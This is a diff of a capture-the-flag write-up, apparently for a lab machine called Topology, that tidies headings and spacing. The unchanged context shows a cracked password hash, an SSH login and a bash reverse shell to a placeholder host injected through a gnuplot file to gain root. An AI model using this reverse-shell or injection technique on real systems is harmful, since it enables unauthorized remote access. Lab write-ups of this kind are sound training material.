@@ -17,7 +17,7 @@ Highlighted sections are the ones that directly led to advancing access.
 4. [Server Enumeration](#server-enumeration)
 5. [Password Cracking](#password-cracking) - **User Flag**
 6. [Enumeration for Privilege Escalation](#enumeration-for-privilege-escalation)
-7. [Command Injection in Gnuplot Files](#command-injection-in-gnuplot-files) - **Root** 
+7. [Command Injection in Gnuplot Files](#command-injection-in-gnuplot-files) - **Root Flag** 
 ## Scanning and Fingerprinting
 
 As always. start with an Nmap scan to get a sense of where to start.
@@ -122,6 +122,7 @@ Next, I cracked the hash using a dictionary attack with `hashcat` and `rockyou.t
 - output -> `$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20`
 
 Now I can ssh onto the machine as `vdaisely`.
+
 ![User Flag | 600](./screenshots/topology_user.png)
 
 ## Enumeration for Privilege Escalation
@@ -168,6 +169,7 @@ Then, I'll put the payload in a PLT file in the `/opt/gnuplot` directory.
 - on target - `echo "system \"bash -c 'bash -i >& /dev/tcp/<your_ip>/9000 0>&1'\"" > gnuplot/revshell.plt`
 
 Then we wait...
+
 ![Root Flag | 600](./screenshots/topology_root.png)
 
 Now we can just `cat` the root flag and submit.
